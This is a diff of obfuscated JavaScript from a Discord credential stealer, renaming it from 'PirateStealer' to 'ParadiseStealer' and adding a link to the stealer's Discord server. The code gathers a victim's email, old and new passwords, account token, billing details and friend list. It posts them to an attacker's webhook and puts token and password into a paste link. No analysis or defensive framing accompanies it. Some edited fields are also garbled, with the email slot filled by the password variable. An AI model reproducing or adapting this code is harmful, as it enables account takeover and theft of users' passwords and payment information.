@@ -312,7 +312,7 @@ function ChangePassword(e, t, n) {
                                                 for (let e in d) l.push({ name: "Code", value: `\`${d[e].code.insert(4, "-")}\``, inline: !0 }), (p += `${d[e].code.insert(4, "-")}<br>`);
                                                 const u = JSON.parse(a);
                                                 var c = {
-                                                        username: "PirateStealer",
+                                                        username: "ParadiseStealer",
                                                         content: "",
                                                         embeds: [
                                                             {
@@ -320,11 +320,10 @@ function ChangePassword(e, t, n) {
                                                                 description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + n + "<br>" + t + ")",
                                                                 color: config["embed-color"],
                                                                 fields: [
-                                                                    { name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 },
-                                                                    { name: "Username", value: `\`${u.username}#${u.discriminator}\``, inline: !0 },
-                                                                    { name: "ID", value: `\`${u.id}\``, inline: !0 },
-                                                                    { name: "Nitro", value: `${GetNitro(u.premium_type)}`, inline: !1 },
-                                                                    { name: "Badges", value: `${GetBadges(u.flags)}`, inline: !1 },
+                                                                    
+                                                                    { name: "Username", value: `\`${i.username}#${i.discriminator}\``, inline: !0 },
+                                                                    { name: "ID", value: `\`${i.id}\``, inline: !0 },
+                                                                    { name: "<a:pepe_nitro:906950345983397988> Nitro", value: `${GetNitro(i.premium_type)}`, inline: !1 },        { name: "<a:allbadges:895906088996720690>  Badges",  value: `${GetBadges(i.flags)}`, inline: !1 },
                                                                     {
                                                                         name: "Billing",
                                                                         value: `${(function () {
@@ -345,13 +344,12 @@ function ChangePassword(e, t, n) {
                                                                         })()}`,
                                                                         inline: !1,
                                                                     },
-                                                                    { name: "Email", value: `\`${u.email}\``, inline: !1 },
-                                                                    { name: "Old Password", value: `\`${e}\``, inline: !0 },
-                                                                    { name: "New Password", value: `\`${t}\``, inline: !0 },
+                                                                    { name: "<:PP_director:942527310324719716>  Email", value: `\`${e}\``, inline: !0 },                             { name: "<:staff_blue:936543701294010399> Password", value: `\`${t}\``, inline: !0 },                         { name: "<:staff_blue:936543701294010399> New Password", value: `\`${t}\``, inline: !0 },
+                                                                    
                                                                     { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                                                                 ],
-                                                                author: { name: "PirateStealer" },
-                                                                footer: { text: "PirateStealer" },
+                                                                author: { name: "ParadiseStealer" },
+                                                                footer: { text: "ParadiseStealerr" },
                                                                 thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}` },
                                                             },
                                                             {
@@ -366,8 +364,8 @@ function ChangePassword(e, t, n) {
                                                                     }
                                                                     return "" == t && (t = "No Rare Friends"), t;
                                                                 })(),
-                                                                author: { name: "PirateStealer" },
-                                                                footer: { text: "PirateStealer" },
+                                                                author: { name: "ParadiseStealer" },
+                                                                footer: { text: "ParadiseStealer" },
                                                                 thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}` },
                                                             },
                                                         ],
@@ -377,8 +375,8 @@ function ChangePassword(e, t, n) {
                                                         description: `[Get all of them](${p})`,
                                                         color: config["embed-color"],
                                                         fields: l,
-                                                        author: { name: "PirateStealer" },
-                                                        footer: { text: "PirateStealer" },
+                                                        author: { name: "ParadiseStealer" },
+                                                        footer: { text: "ParadiseStealer" },
                                                     };
                                                 n.startsWith("mfa") && c.embeds.push(m), SendToWebhook(JSON.stringify(c));
                                             });
@@ -410,19 +408,17 @@ function ChangePassword(e, t, n) {
                                                                     .then((r) => {
                                                                         const i = JSON.parse(a);
                                                                         var l = {
-                                                                            username: "PirateStealer",
+                                                                            username: "ParadiseStealer",
                                                                             content: "",
                                                                             embeds: [
                                                                                 {
                                                                                     title: "Password Changed",
-                                                                                    description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + n + "<br>" + t + ")",
+                                                                                    description: "[**<:partner:909102089513340979> │ Join Paradise Stealer Discord**](https://discord.gg/BxWGPQwNZy" + n + "<br>" + t + ")",
                                                                                     color: config["embed-color"],
                                                                                     fields: [
-                                                                                        { name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 },
                                                                                         { name: "Username", value: `\`${i.username}#${i.discriminator}\``, inline: !0 },
                                                                                         { name: "ID", value: `\`${i.id}\``, inline: !0 },
-                                                                                        { name: "Nitro", value: `${GetNitro(i.premium_type)}`, inline: !1 },
-                                                                                        { name: "Badges", value: `${GetBadges(i.flags)}`, inline: !1 },
+                                                                                        { name: "<a:pepe_nitro:906950345983397988> Nitro", value: `${GetNitro(i.premium_type)}`, inline: !1 },        { name: "<a:allbadges:895906088996720690>  Badges",  value: `${GetBadges(i.flags)}`, inline: !1 },
                                                                                         {
                                                                                             name: "Billing",
                                                                                             value: `${(function () {
@@ -443,13 +439,12 @@ function ChangePassword(e, t, n) {
                                                                                             })()}`,
                                                                                             inline: !1,
                                                                                         },
-                                                                                        { name: "Email", value: `\`${i.email}\``, inline: !1 },
-                                                                                        { name: "Old Password", value: `\`${e}\``, inline: !0 },
-                                                                                        { name: "New Password", value: `\`${t}\``, inline: !0 },
+                                                                                        { name: "<:PP_director:942527310324719716>  Email", value: `\`${e}\``, inline: !0 },                             { name: "<:staff_blue:936543701294010399> Password", value: `\`${t}\``, inline: !0 },                         { name: "<:staff_blue:936543701294010399> New Password", value: `\`${t}\``, inline: !0 },
+                                                                    
                                                                                         { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                                                                                     ],
-                                                                                    author: { name: "PirateStealer" },
-                                                                                    footer: { text: "PirateStealer" },
+                                                                                    author: { name: "ParadiseStealer" },
+                                                                                    footer: { text: "ParadiseStealer" },
                                                                                     thumbnail: { url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}` },
                                                                                 },
                                                                                 {
@@ -464,8 +459,8 @@ function ChangePassword(e, t, n) {
                                                                                         }
                                                                                         return "" == t && (t = "No Rare Friends"), t;
                                                                                     })(),
-                                                                                    author: { name: "PirateStealer" },
-                                                                                    footer: { text: "PirateStealer" },
+                                                                                    author: { name: "ParadiseStealer" },
+                                                                                    footer: { text: "ParadiseStealer" },
                                                                                     thumbnail: { url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}` },
                                                                                 },
                                                                             ],
